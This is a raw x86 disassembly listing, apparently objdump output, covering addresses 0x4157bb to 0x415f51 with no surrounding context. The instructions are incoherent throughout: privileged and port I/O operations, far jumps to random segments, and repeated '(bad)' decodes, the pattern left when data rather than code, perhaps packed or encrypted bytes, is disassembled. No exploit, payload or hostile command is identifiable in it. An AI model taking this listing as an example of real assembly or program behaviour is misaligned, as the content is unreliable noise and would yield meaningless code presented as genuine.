  4157bb:	push   cs
  4157bc:	popf   
  4157bd:	lea    edx,[edx+0x2c]
  4157c0:	arpl   WORD PTR [esi+ecx*2-0x30],ax
  4157c4:	imul   eax,edi,0xffffffce
  4157c7:	inc    edi
  4157c8:	nop
  4157c9:	lods   eax,DWORD PTR ds:[esi]
  4157ca:	sub    BYTE PTR [edx-0x78],0x12
  4157ce:	cli    
  4157cf:	icebp  
  4157d0:	xor    al,0x25
  4157d2:	hlt    
  4157d3:	push   esp
  4157d4:	jno    0x415832
  4157d6:	push   ecx
  4157d7:	xchg   esi,eax
  4157d8:	in     eax,dx
  4157d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4157da:	bnd jno 0x415844
  4157dd:	jnp    0x415765
  4157df:	inc    ebx
  4157e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4157e1:	sbb    DWORD PTR [ebx+esi*1],eax
  4157e4:	stos   DWORD PTR es:[edi],eax
  4157e5:	repz cmp eax,0x2dce5ba
  4157eb:	sbb    al,0x66
  4157ed:	mov    edi,0xeb6baeba
  4157f2:	push   esi
  4157f3:	out    0xc1,al
  4157f5:	sbb    eax,0x2e46717c
  4157fa:	cdq    
  4157fb:	rcl    BYTE PTR [edi+eiz*1],1
  4157fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4157ff:	mov    WORD PTR [ecx-0x3f],cs
  415802:	and    ebx,ebp
  415804:	lea    esp,[ebx-0x7b]
  415807:	div    DWORD PTR [ebx+edi*2-0xa612f29]
  41580e:	sub    DWORD PTR [ebx+ebx*8],esp
  415811:	lods   al,BYTE PTR ds:[esi]
  415812:	sbb    eax,0x4a4250d3
  415817:	sbb    al,0x9e
  415819:	shr    bl,0x61
  41581c:	add    al,0xd2
  41581e:	mov    dh,0x82
  415820:	xchg   BYTE PTR ds:0xda94c917,al
  415826:	sbb    BYTE PTR [eax+esi*8+0x790271f8],bh
  41582d:	in     eax,0xc6
  41582f:	xchg   esi,eax
  415830:	and    DWORD PTR [ebp+0x8],0x0
  415834:	pop    ss
  415835:	mov    ds:0x4b2616f1,al
  41583a:	push   edx
  41583b:	outs   dx,BYTE PTR ds:[esi]
  41583c:	es jnp 0x4157c1
  41583f:	dec    esp
  415840:	jmp    0xfd4e5c82
  415845:	js     0x415864
  415847:	cmp    esp,esi
  415849:	(bad)
  41584c:	inc    ebp
  41584d:	imul   edx,DWORD PTR [ecx+edi*2-0x7a],0x69
  415852:	paddb  mm4,mm4
  415855:	jns    0x4158b1
  415857:	pop    ecx
  415858:	xor    al,0x7a
  41585a:	inc    esi
  41585b:	or     dl,BYTE PTR [edx]
  41585d:	adc    eax,0xac1fff43
  415862:	mov    bh,0xc1
  415864:	or     DWORD PTR [ecx-0x60260208],ecx
  41586a:	adc    cl,al
  41586c:	int    0x9a
  41586e:	in     al,dx
  41586f:	jp     0x415821
  415871:	ss stos DWORD PTR es:[edi],eax
  415873:	pop    edx
  415874:	sbb    al,0x5c
  415876:	sbb    eax,0xaa1c9dfd
  41587b:	and    DWORD PTR [edx+0x1d8fd905],0xffffffab
  415882:	iret   
  415883:	pusha  
  415884:	jecxz  0x41583b
  415886:	jb     0x41582e
  415888:	mov    edi,0xd7129468
  41588d:	xlat   BYTE PTR ds:[ebx]
  41588e:	fs cmp eax,0x1e58ee34
  415894:	mov    BYTE PTR [eax+0x9c56edc],cl
  41589a:	or     ch,cl
  41589c:	dec    BYTE PTR [ebx+ebx*8+0x34a96eaa]
  4158a3:	cmp    ah,cl
  4158a5:	add    al,dl
  4158a7:	retf   0x2ab2
  4158aa:	or     DWORD PTR [edi-0x250dda72],ecx
  4158b0:	icebp  
  4158b1:	jge    0x41584c
  4158b3:	xchg   DWORD PTR [edi+0x3f],esp
  4158b6:	xchg   edi,eax
  4158b7:	shl    DWORD PTR [edi-0x7fb867aa],cl
  4158bd:	popf   
  4158be:	dec    esi
  4158bf:	mov    eax,0x94510fc4
  4158c4:	cwde   
  4158c5:	pusha  
  4158c6:	push   ecx
  4158c7:	jb     0x4158e8
  4158c9:	or     bl,cl
  4158cb:	xor    eax,0xcba28115
  4158d0:	(bad)  
  4158d1:	push   ds
  4158d2:	sbb    bh,0xc7
  4158d5:	mov    bl,0x93
  4158d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4158d8:	mov    ebx,es
  4158da:	fstp   QWORD PTR [ebx+0xc]
  4158dd:	cmp    ch,BYTE PTR [edi+0x51]
  4158e0:	retf   0xaf4
  4158e3:	jb     0x41593b
  4158e5:	test   DWORD PTR [ebp-0x68c8cde],ecx
  4158eb:	mov    ebp,ds
  4158ed:	sbb    al,0x7a
  4158ef:	cmp    ah,BYTE PTR [ecx]
  4158f1:	xor    DWORD PTR [esi+0x79],ebp
  4158f4:	push   ds
  4158f5:	(bad)  
  4158f6:	mov    ecx,0x8f7659ac
  4158fb:	jbe    0x4158d7
  4158fd:	out    0xbe,eax
  4158ff:	or     BYTE PTR [esi+0x35d0ab39],dh
  415905:	mov    edx,DWORD PTR [eax+0x31]
  415908:	out    0x6c,eax
  41590a:	scas   eax,DWORD PTR es:[edi]
  41590b:	push   edi
  41590c:	xchg   esi,eax
  41590d:	adc    cl,dh
  41590f:	add    BYTE PTR [eax*4-0x5a45d62d],bh
  415916:	xchg   edx,eax
  415917:	sbb    ebx,DWORD PTR [ebx+0x43]
  41591a:	mov    dl,0xcc
  41591c:	sub    cl,BYTE PTR [ebx-0x4ad48050]
  415922:	ror    BYTE PTR [ecx-0x48],1
  415925:	sub    BYTE PTR [esi+0x6691f957],0x6e
  41592c:	in     al,dx
  41592d:	push   ebp
  41592e:	fsub   QWORD PTR [ebp-0x473323fb]
  415934:	mov    bh,BYTE PTR [edi]
  415936:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415937:	or     al,0x4a
  415939:	cmp    DWORD PTR [esi],ecx
  41593b:	stos   BYTE PTR es:[edi],al
  41593c:	xor    ebp,DWORD PTR [esi+0x9]
  41593f:	lods   al,BYTE PTR ds:[esi]
  415940:	mov    al,0x44
  415942:	shr    BYTE PTR [ebx+0x43cc061b],0xd6
  415949:	mov    ds:0xc700a8ac,al
  41594e:	sbb    esi,0x21
  415951:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415952:	mov    eax,ecx
  415954:	adc    ecx,esi
  415956:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415957:	dec    esp
  415958:	cmp    BYTE PTR [eax+0x3c5fecf],ch
  41595e:	sbb    eax,0xb664d74b
  415963:	sahf   
  415964:	mov    bl,0x32
  415966:	add    DWORD PTR [edx],edx
  415968:	sbb    al,BYTE PTR ds:0xa4124fe2
  41596e:	pop    ss
  41596f:	push   esi
  415970:	int3   
  415971:	dec    esp
  415972:	pop    ebx
  415973:	js     0x41599d
  415975:	pop    esi
  415976:	adc    edi,DWORD PTR [edi-0x31]
  415979:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41597a:	lea    ebx,[esi+0x5b23dc06]
  415980:	add    esi,DWORD PTR [edx]
  415982:	retf   
  415983:	int    0x52
  415985:	into   
  415986:	in     eax,0xe7
  415988:	into   
  415989:	cmp    al,0x85
  41598b:	adc    cl,BYTE PTR [ebx*2+0x31aee38d]
  415992:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415993:	xor    DWORD PTR [ebp-0x4a1ce0cb],ebp
  415999:	jmp    0x8fe4:0x36c652a0
  4159a0:	pop    edx
  4159a1:	out    0x2e,al
  4159a3:	mov    ecx,0xbc33bd17
  4159a8:	jl     0x4159f9
  4159aa:	mov    ds:0x6ececca4,eax
  4159af:	sbb    al,BYTE PTR [edi]
  4159b1:	or     dh,0x17
  4159b4:	adc    BYTE PTR [ebx+0x72],dh
  4159b7:	arpl   sp,dx
  4159b9:	inc    edx
  4159ba:	adc    ch,0xbb
  4159bd:	scas   al,BYTE PTR es:[edi]
  4159be:	mov    WORD PTR [edx+0x8],ds
  4159c1:	popa   
  4159c2:	pop    eax
  4159c3:	loopne 0x4159e4
  4159c5:	adc    DWORD PTR [edi+0x31300230],esi
  4159cb:	retf   
  4159cc:	(bad)  
  4159cd:	cwde   
  4159ce:	fadd   DWORD PTR [eax+0x35]
  4159d1:	adc    DWORD PTR [eax-0x53d7397c],eax
  4159d7:	pop    es
  4159d8:	jnp    0x415a36
  4159da:	ret    0x6d6c
  4159dd:	cli    
  4159de:	out    0xd3,al
  4159e0:	out    dx,al
  4159e1:	sbb    eax,0xe6b15110
  4159e6:	mov    dl,0x5f
  4159e8:	(bad)  
  4159e9:	ror    eax,cl
  4159eb:	jne    0x4159a0
  4159ed:	aad    0xee
  4159ef:	cmp    DWORD PTR [ebx+0x67c31c3f],edx
  4159f5:	mov    ecx,0xa1599171
  4159fa:	pop    ebp
  4159fb:	dec    ecx
  4159fc:	mov    dh,0x1a
  4159fe:	jle    0x415a6a
  415a00:	mov    ebx,0xee1a5bb4
  415a05:	mov    BYTE PTR [eax],0x1
  415a08:	lahf   
  415a09:	outs   dx,BYTE PTR ds:[esi]
  415a0a:	adc    edi,DWORD PTR [ecx+0x3368213c]
  415a10:	or     DWORD PTR [ebp-0x224ca394],eax
  415a16:	lods   eax,DWORD PTR ds:[esi]
  415a17:	div    BYTE PTR [ebx-0x1f]
  415a1a:	xchg   edi,eax
  415a1b:	pop    ss
  415a1c:	xchg   ebp,eax
  415a1d:	cmp    eax,0xca0b701b
  415a22:	sar    al,1
  415a24:	ss inc eax
  415a26:	xlat   BYTE PTR ds:[ebx]
  415a27:	and    al,0xc1
  415a29:	sub    al,0x35
  415a2b:	sub    ebx,edx
  415a2d:	dec    esp
  415a2e:	or     BYTE PTR [eax+ebx*8+0x33],cl
  415a32:	xchg   DWORD PTR [eax+0x6868f70a],ebx
  415a38:	sbb    ecx,DWORD PTR [eax]
  415a3a:	push   ds
  415a3b:	mov    ds:0x5fdae1c4,al
  415a40:	sbb    edi,DWORD PTR [edi+0x6c]
  415a43:	xor    DWORD PTR [eax],eax
  415a45:	fbstp  TBYTE PTR [ebp-0x37b0eae]
  415a4b:	pop    ds
  415a4c:	into   
  415a4d:	repnz imul ebx,DWORD PTR ds:0x6a06453b,0x8
  415a55:	iret   
  415a56:	imul   ebx,ebp,0xeb320c80
  415a5c:	lods   eax,DWORD PTR ds:[esi]
  415a5d:	addr16 aad 0x14
  415a60:	js     0x4159e6
  415a62:	cwde   
  415a63:	aas    
  415a64:	clc    
  415a65:	pop    ds
  415a66:	and    eax,0xcdb912ee
  415a6b:	aas    
  415a6c:	(bad)  
  415a6d:	shl    BYTE PTR [ebx+0x6c758628],1
  415a73:	mov    esi,0xe8c98655
  415a78:	scas   al,BYTE PTR es:[edi]
  415a79:	xlat   BYTE PTR ds:[ebx]
  415a7a:	sbb    BYTE PTR [esp+ebx*8],0x12
  415a7e:	mov    ch,0x16
  415a80:	(bad)  
  415a81:	(bad)  [edx+0x70]
  415a84:	push   ss
  415a85:	call   0xb839ee3a
  415a8a:	jb     0x415a0e
  415a8c:	daa    
  415a8d:	jbe    0x415a14
  415a8f:	inc    ebx
  415a90:	jo     0x415ab0
  415a92:	xlat   BYTE PTR ds:[ebx]
  415a93:	nop
  415a94:	loope  0x415abb
  415a96:	fiadd  DWORD PTR [edi+0x625c1dfa]
  415a9c:	inc    ebx
  415a9d:	repnz inc ecx
  415a9f:	push   edx
  415aa0:	sbb    eax,0x6c103d32
  415aa5:	in     eax,dx
  415aa6:	dec    eax
  415aa7:	jp     0x415a85
  415aa9:	push   es
  415aaa:	and    DWORD PTR [edx+0x40],ecx
  415aad:	into   
  415aae:	mov    al,ds:0x79e67666
  415ab3:	add    eax,0xb9a8027
  415ab8:	fwait
  415ab9:	xchg   eax,esp
  415abb:	scas   al,BYTE PTR es:[edi]
  415abc:	ss rol edx,0x44
  415ac0:	cmp    eax,0x8df57515
  415ac5:	fnstenv [edi+0x5e1ce12c]
  415acb:	mov    ebp,0xc0293899
  415ad0:	pop    esp
  415ad1:	stos   BYTE PTR es:[edi],al
  415ad2:	stc    
  415ad3:	jmp    0x415ac9
  415ad5:	aaa    
  415ad6:	fidiv  WORD PTR [edi]
  415ad8:	and    DWORD PTR [ecx+esi*1+0x75],esi
  415adc:	ja     0x415acb
  415ade:	adc    BYTE PTR [ebp+0x45],bl
  415ae1:	das    
  415ae2:	aam    0xfc
  415ae4:	and    cl,BYTE PTR [esi]
  415ae6:	sti    
  415ae7:	mov    es,WORD PTR [ecx-0x6eeb4814]
  415aed:	mov    ecx,0xd128c3f2
  415af2:	sub    eax,ebp
  415af4:	in     al,0x60
  415af6:	jge    0x415aef
  415af8:	mov    dl,0x9
  415afa:	mov    BYTE PTR ds:0x5debc1d0,ah
  415b00:	dec    esi
  415b01:	adc    eax,0x5af2e3bf
  415b06:	sbb    bl,dh
  415b08:	jmp    0x66d084ad
  415b0d:	out    dx,al
  415b0e:	push   ecx
  415b0f:	cdq    
  415b10:	leave  
  415b11:	dec    ebx
  415b12:	push   ebx
  415b13:	aam    0x6b
  415b15:	fcmovbe st,st(3)
  415b17:	cmp    cl,BYTE PTR [ecx]
  415b19:	pusha  
  415b1a:	fwait
  415b1b:	mov    dl,0x27
  415b1d:	mov    bh,0x90
  415b1f:	dec    ebp
  415b20:	mov    esi,0xc80f4583
  415b25:	or     DWORD PTR [ebp+0x736e0767],esp
  415b2b:	add    dl,al
  415b2d:	inc    ecx
  415b2e:	and    DWORD PTR [ebx],ebp
  415b30:	cmp    al,0x5b
  415b32:	lods   eax,DWORD PTR ds:[esi]
  415b33:	push   0x8e1d724c
  415b38:	addr16 jmp 0x415ad2
  415b3b:	cmp    cl,BYTE PTR ds:0xb02619a
  415b41:	xor    al,0xd5
  415b43:	je     0x415b05
  415b45:	pop    esp
  415b46:	or     bl,cl
  415b48:	mov    BYTE PTR ds:0x702dd8a8,ch
  415b4e:	sub    al,0xd
  415b50:	mov    dl,al
  415b52:	lods   eax,DWORD PTR ds:[esi]
  415b53:	jnp    0x415bb6
  415b55:	fcomp  QWORD PTR [ebx]
  415b57:	add    DWORD PTR [eax+edi*4+0x13b2908c],edi
  415b5e:	aam    0x83
  415b60:	mov    ebp,0x68d52d3b
  415b65:	jp     0x415bbf
  415b67:	stos   DWORD PTR es:[edi],eax
  415b68:	loop   0x415b32
  415b6a:	lea    ecx,fs:[edi]
  415b6d:	call   0xa3fbc267
  415b72:	js     0x415ba5
  415b74:	mov    eax,0x530105f6
  415b79:	outs   dx,BYTE PTR ds:[esi]
  415b7a:	push   ebx
  415b7b:	fistp  WORD PTR [ebx]
  415b7d:	add    BYTE PTR [eax+ecx*4-0x2226089],0xba
  415b85:	sbb    al,0x3d
  415b87:	inc    esi
  415b88:	pop    ds
  415b89:	stos   DWORD PTR es:[edi],eax
  415b8a:	jl     0x415bea
  415b8c:	jle    0x415b9f
  415b8e:	jae    0x415bc7
  415b90:	inc    esp
  415b91:	mov    dl,0x37
  415b93:	ins    BYTE PTR es:[edi],dx
  415b94:	and    cl,ch
  415b96:	je     0x415b55
  415b98:	shl    BYTE PTR [ebp+0x7fcd4116],1
  415b9e:	(bad)  
  415b9f:	ds outs dx,DWORD PTR fs:[esi]
  415ba2:	cmp    BYTE PTR [edi+0x7e],0xde
  415ba6:	lods   eax,DWORD PTR ds:[esi]
  415ba7:	add    BYTE PTR [ebp-0x73],cl
  415baa:	fstp   QWORD PTR [ebp+0x40]
  415bad:	xchg   edx,eax
  415bae:	pop    edi
  415baf:	retf   0x57
  415bb2:	lea    edx,[esi]
  415bb4:	repz jmp 0xbb79:0x84bb34c1
  415bbc:	jge    0x415b7d
  415bbe:	push   0x75fc64d2
  415bc3:	les    ecx,FWORD PTR [ecx+0x3f]
  415bc6:	mov    edx,ebx
  415bc8:	inc    eax
  415bc9:	imul   ebx,DWORD PTR [edx-0x38],0x4ac1f781
  415bd0:	dec    esp
  415bd1:	cwde   
  415bd2:	cmp    dh,dh
  415bd4:	out    0xdc,eax
  415bd6:	adc    cl,cl
  415bd8:	inc    edi
  415bd9:	aam    0x93
  415bdb:	push   esp
  415bdc:	inc    ebx
  415bdd:	pop    esp
  415bde:	adc    ch,BYTE PTR [edx+eiz*1]
  415be1:	mov    BYTE PTR [edx-0x5],ah
  415be4:	dec    edi
  415be5:	mov    ecx,0x740eefab
  415bea:	in     al,dx
  415beb:	cmp    eax,0x3757baa2
  415bf0:	and    BYTE PTR [ecx+eiz*2-0x25],dl
  415bf4:	pop    esi
  415bf5:	nop
  415bf6:	ins    DWORD PTR es:[edi],dx
  415bf7:	mov    WORD PTR [eax+0x55f1ec24],ds
  415bfd:	lds    esi,FWORD PTR cs:[esp+edi*8+0x3f652b2a]
  415c05:	and    esi,ebx
  415c07:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415c08:	jmp    0xe9fe1f74
  415c0d:	pop    ds
  415c0e:	and    cl,BYTE PTR [eax]
  415c10:	pushf  
  415c11:	(bad)  
  415c13:	jge    0x415c3e
  415c15:	xor    al,0x22
  415c17:	sbb    esi,DWORD PTR [esi+ebx*4]
  415c1a:	and    BYTE PTR [ebp-0xb8b0f31],al
  415c20:	sbb    dh,al
  415c22:	xor    al,0x38
  415c24:	jp     0x415be6
  415c26:	adc    dl,BYTE PTR [edi-0x79dddff8]
  415c2c:	pushf  
  415c2d:	dec    ecx
  415c2e:	push   ebx
  415c2f:	(bad)  
  415c30:	into   
  415c31:	out    0xe0,eax
  415c33:	test   al,0x50
  415c35:	repz cwde 
  415c37:	jne    0x415c42
  415c39:	rol    ebx,0x4d
  415c3c:	ja     0x415cb3
  415c3e:	xchg   ebp,eax
  415c3f:	loope  0x415bef
  415c41:	or     eax,0xe3e7bda1
  415c46:	add    eax,0xcbd3da1
  415c4b:	or     al,BYTE PTR [ebx+esi*4-0x271a1d6a]
  415c52:	pop    esp
  415c53:	cmp    dh,ah
  415c55:	mov    edi,0xfa524c50
  415c5a:	iret   
  415c5b:	ins    DWORD PTR es:[edi],dx
  415c5c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415c5d:	and    al,BYTE PTR [esi]
  415c5f:	jmp    FWORD PTR [ebx]
  415c61:	mov    esp,0x330a8a0f
  415c66:	sub    BYTE PTR [edx+0x4fc239a0],dl
  415c6c:	cli    
  415c6d:	push   esp
  415c6e:	fist   WORD PTR [esp+esi*2-0x41]
  415c72:	xor    cl,BYTE PTR ds:0x93d7e61b
  415c78:	ret    
  415c79:	clc    
  415c7a:	push   esp
  415c7b:	clc    
  415c7c:	pop    es
  415c7d:	xchg   DWORD PTR [edx+0x63],esi
  415c80:	add    eax,0x2a4adb49
  415c85:	xor    ebp,DWORD PTR [esi-0x52]
  415c88:	mov    ebx,0x5e68f0c2
  415c8d:	cmp    DWORD PTR [ecx],0xffffffe2
  415c90:	or     al,0x72
  415c92:	bound  ebp,QWORD PTR [esp+ebp*4-0x61c1cb14]
  415c99:	jmp    0xfabc:0x45be806e
  415ca0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415ca1:	int    0xfa
  415ca3:	pop    esi
  415ca4:	pop    ebx
  415ca5:	ret    0xd225
  415ca8:	push   edx
  415ca9:	push   ss
  415caa:	or     eax,0x887593a9
  415caf:	not    ah
  415cb1:	loope  0x415c5e
  415cb3:	push   esp
  415cb4:	icebp  
  415cb5:	xchg   edi,eax
  415cb6:	xor    eax,0xce5c5828
  415cbb:	daa    
  415cbc:	gs cwde 
  415cbe:	mov    BYTE PTR [edx],bl
  415cc0:	sbb    eax,DWORD PTR [eax]
  415cc2:	test   eax,0xfacb767d
  415cc7:	ss dec esi
  415cc9:	pop    edx
  415cca:	dec    ebx
  415ccb:	sub    al,0x49
  415ccd:	inc    edi
  415cce:	pop    ebp
  415ccf:	dec    esi
  415cd0:	in     al,dx
  415cd1:	scas   al,BYTE PTR es:[edi]
  415cd2:	into   
  415cd3:	shr    cl,cl
  415cd5:	sub    al,0x8a
  415cd7:	test   DWORD PTR [ebx+0x69],0x9155cb7b
  415cde:	js     0x415c86
  415ce0:	in     al,0xea
  415ce2:	adc    ebp,DWORD PTR [ebp+0x24401b94]
  415ce8:	dec    esp
  415ce9:	test   eax,0x6d25d400
  415cee:	dec    eax
  415cef:	mov    ebp,0x124041ec
  415cf4:	shl    BYTE PTR [ebp-0x6b5fc2df],0x42
  415cfb:	sub    BYTE PTR [edi+0x34],ch
  415cfe:	out    dx,al
  415cff:	add    ah,BYTE PTR [esp+ebx*1]
  415d02:	or     BYTE PTR fs:[edi+0x76],al
  415d06:	cmp    esp,edi
  415d08:	cdq    
  415d09:	or     ebp,DWORD PTR [esi+0x43d7d82d]
  415d0f:	call   0xd4e2:0x7a097e4f
  415d16:	outs   dx,DWORD PTR ds:[esi]
  415d17:	mov    esi,0xac9f3d07
  415d1d:	ds cmp bh,bl
  415d20:	arpl   WORD PTR [eax+eiz*1+0x1d],ax
  415d24:	adc    DWORD PTR [edx],0x7b38a376
  415d2a:	xchg   edi,eax
  415d2b:	imul   eax,DWORD PTR [esi+0x5c],0xffffff87
  415d2f:	das    
  415d30:	dec    edx
  415d31:	int3   
  415d32:	outs   dx,BYTE PTR ds:[esi]
  415d33:	mov    al,0xee
  415d35:	add    esp,DWORD PTR [ebp+0x27]
  415d38:	sub    BYTE PTR [eax-0x45],0xd9
  415d3c:	test   BYTE PTR [esi],dh
  415d3e:	std    
  415d3f:	jg     0x415cf5
  415d41:	xchg   DWORD PTR [edi+0x68],ebx
  415d44:	mov    ecx,0x9860953e
  415d49:	adc    BYTE PTR [ebx+0x37],bh
  415d4c:	mov    esp,0x55969f60
  415d51:	xor    DWORD PTR [ecx+0x1e],ebp
  415d54:	adc    edx,DWORD PTR [ebp+0x3f]
  415d57:	jle    0x415d0e
  415d59:	sbb    eax,0x6ad72264
  415d5e:	popa   
  415d5f:	push   0xffffffa4
  415d61:	ins    BYTE PTR es:[edi],dx
  415d62:	mov    eax,0x61d6dbbb
  415d67:	mov    esp,0x6405676a
  415d6c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415d6d:	jmp    0x320c0e76
  415d72:	inc    edx
  415d73:	lock fwait
  415d75:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415d76:	repnz out 0xbd,al
  415d79:	enter  0x5ce7,0x46
  415d7d:	lahf   
  415d7e:	out    dx,al
  415d7f:	shr    DWORD PTR [eax+0x23],0x6
  415d83:	mov    ecx,0xd8bf45bd
  415d88:	jg     0x415dbb
  415d8a:	mov    edi,ebx
  415d8c:	pop    eax
  415d8d:	call   0xef9adcd5
  415d92:	in     al,dx
  415d93:	xchg   ecx,eax
  415d94:	idiv   DWORD PTR [ebx]
  415d96:	push   0x4417e881
  415d9b:	add    BYTE PTR [ecx-0x1a],0xe9
  415d9f:	or     al,0x25
  415da1:	pushf  
  415da2:	shl    DWORD PTR [esi+0x4f],1
  415da5:	shr    BYTE PTR [ecx+0x581fb9e3],cl
  415dab:	pop    ecx
  415dac:	add    eax,0xf4436cc
  415db1:	mov    eax,ds:0x6513082b
  415db6:	mov    esp,edx
  415db8:	fisubr DWORD PTR [ecx-0x5a]
  415dbb:	pop    es
  415dbc:	sahf   
  415dbd:	mov    BYTE PTR [ebp+0x6c],dl
  415dc0:	pop    edi
  415dc1:	cwde   
  415dc2:	es cmp eax,0xbd256651
  415dc8:	ror    esi,cl
  415dca:	test   al,0x13
  415dcc:	and    eax,0x9cb729c2
  415dd1:	loop   0x415df1
  415dd3:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  415dd5:	cli    
  415dd6:	lds    ebx,FWORD PTR [edi+0x63]
  415dd9:	sub    ebp,DWORD PTR [esp+eiz*8+0x44]
  415ddd:	cmp    al,0x76
  415ddf:	cmp    BYTE PTR [esi],dh
  415de1:	jmp    0x415e4b
  415de3:	cmc    
  415de4:	jecxz  0x415db7
  415de6:	jmp    0x937e:0x9174b4fe
  415ded:	push   0x3a
  415def:	dec    esi
  415df0:	or     cl,BYTE PTR [ebp+0x51a5f93b]
  415df6:	aad    0xcd
  415df8:	pushf  
  415df9:	or     edx,DWORD PTR [edx-0x12ebb46e]
  415dff:	mov    ?,ebp
  415e01:	sar    BYTE PTR [edx+edi*8-0x4382f7a1],1
  415e08:	and    BYTE PTR [edi],0xbc
  415e0b:	cmp    eax,0xd0d1f028
  415e10:	and    DWORD PTR [ecx+0x51],esi
  415e13:	out    dx,eax
  415e14:	and    bh,dl
  415e16:	and    bl,BYTE PTR [ebx]
  415e18:	add    BYTE PTR [esi-0x661f7e1c],al
  415e1e:	shl    DWORD PTR [ebp+0x62],cl
  415e21:	shl    BYTE PTR [eax-0xb],cl
  415e24:	mov    dh,0xc7
  415e26:	icebp  
  415e27:	mov    al,0xd3
  415e29:	icebp  
  415e2a:	cmp    eax,esi
  415e2c:	out    0xd6,al
  415e2e:	aaa    
  415e2f:	loop   0x415dfb
  415e31:	paddd  mm0,QWORD PTR [ecx-0x49b0ef5]
  415e38:	cmc    
  415e39:	jcxz   0x415eb0
  415e3c:	xchg   ebp,eax
  415e3d:	fst    QWORD PTR [edx]
  415e3f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415e40:	mov    ecx,0xf3636e3
  415e45:	pushf  
  415e46:	and    ah,bh
  415e48:	mov    ebx,0xac3f1f2d
  415e4d:	sahf   
  415e4e:	mov    esi,0x8d913549
  415e53:	out    0x48,al
  415e55:	jb     0x415ebf
  415e57:	pop    ebx
  415e58:	call   FWORD PTR [edi+0x67]
  415e5b:	not    BYTE PTR [ebp-0x2e]
  415e5e:	mov    esp,0x7703f53b
  415e63:	cmp    DWORD PTR [esi+0x55],ebp
  415e66:	and    eax,0xedda8893
  415e6b:	or     esp,DWORD PTR [edi-0x59]
  415e6e:	outs   dx,DWORD PTR ds:[esi]
  415e6f:	jmp    0x8468d857
  415e74:	and    BYTE PTR [edx],cl
  415e76:	mov    cl,0xf1
  415e78:	xchg   edi,ecx
  415e7a:	into   
  415e7b:	cld    
  415e7c:	dec    edi
  415e7d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415e7e:	add    DWORD PTR [ebp+0x6a],eax
  415e81:	rcl    esp,cl
  415e83:	cmp    eax,0x9c559ed0
  415e88:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415e89:	mov    esp,0x49e932f1
  415e8e:	sahf   
  415e8f:	in     al,dx
  415e90:	or     esi,ebp
  415e92:	cmp    BYTE PTR [eax+0x49],ch
  415e95:	pop    esi
  415e96:	mov    ds:0xe823cdb5,al
  415e9b:	push   ebp
  415e9c:	loope  0x415ea3
  415e9e:	test   al,bl
  415ea0:	inc    edx
  415ea1:	or     edx,DWORD PTR [ebx+ebp*2]
  415ea4:	jg     0x415e2b
  415ea6:	out    0x63,eax
  415ea8:	pop    ss
  415ea9:	ja     0x415e78
  415eab:	sbb    ebp,DWORD PTR [eax+edi*8]
  415eae:	rcl    DWORD PTR [edx],cl
  415eb0:	(bad)  
  415eb1:	cmp    al,0x82
  415eb3:	cmp    al,0x88
  415eb5:	adc    eax,0xa3cfe6a8
  415eba:	inc    edx
  415ebb:	inc    esi
  415ebc:	call   0xee42b17c
  415ec1:	fild   WORD PTR [ebx+0x3463c1b7]
  415ec7:	fistp  DWORD PTR [ecx+0x27]
  415eca:	addr16 jnp 0x415e7f
  415ecd:	pop    esi
  415ece:	and    al,0xa9
  415ed0:	out    0x13,al
  415ed2:	shl    BYTE PTR [ecx],0xbd
  415ed5:	dec    ebp
  415ed6:	add    bh,dh
  415ed8:	retf   
  415ed9:	or     ebx,DWORD PTR [ebp+0x32]
  415edc:	inc    esi
  415edd:	pop    ebx
  415ede:	and    eax,0xca1d7a03
  415ee3:	scas   eax,DWORD PTR es:[edi]
  415ee4:	dec    BYTE PTR [edx]
  415ee6:	cmp    eax,0xd3be491c
  415eeb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415eec:	xchg   edi,eax
  415eed:	dec    edx
  415eee:	dec    esi
  415eef:	data16 adc al,0xf9
  415ef2:	(bad)  
  415ef3:	retf   
  415ef4:	jg     0x415e96
  415ef6:	push   edx
  415ef7:	sbb    ah,0x2f
  415efa:	cmp    eax,0x4c307c45
  415eff:	sbb    BYTE PTR [edx+0x28a38fc8],ch
  415f05:	cmp    BYTE PTR [ecx],bl
  415f07:	stos   BYTE PTR es:[edi],al
  415f08:	fisttp WORD PTR [ebx]
  415f0a:	cmc    
  415f0b:	ret    
  415f0c:	arpl   WORD PTR [eax],si
  415f0e:	ins    DWORD PTR es:[edi],dx
  415f0f:	mov    ch,0x98
  415f11:	xchg   esp,eax
  415f12:	jae    0x415ec8
  415f14:	(bad)  
  415f15:	cmp    BYTE PTR [edx],bh
  415f17:	sub    bl,BYTE PTR [edx+0x20b896b6]
  415f1d:	or     DWORD PTR [ebp-0x65],edi
  415f20:	jle    0x415f14
  415f22:	aam    0x84
  415f24:	dec    ebp
  415f25:	sbb    ah,BYTE PTR [edx+ecx*8+0x1145d023]
  415f2c:	and    BYTE PTR [edx-0x4ff3d039],dh
  415f32:	or     BYTE PTR gs:[edx+edx*2+0x3c],0xbb
  415f38:	pop    DWORD PTR [esi+0x299b1c35]
  415f3e:	stos   BYTE PTR es:[edi],al
  415f3f:	mov    fs,WORD PTR [ebx-0xc]
  415f42:	xchg   ebx,eax
  415f43:	outs   dx,BYTE PTR ds:[esi]
  415f44:	shl    DWORD PTR [ebx+0x2ed85251],cl
  415f4a:	(bad)  
  415f4b:	shl    BYTE PTR [ecx+0x2d],cl
  415f4e:	sub    ch,BYTE PTR [esi-0x68]
  415f51:	mov    BYTE PTR [esi+eax*4-0x5c05b84e],dh
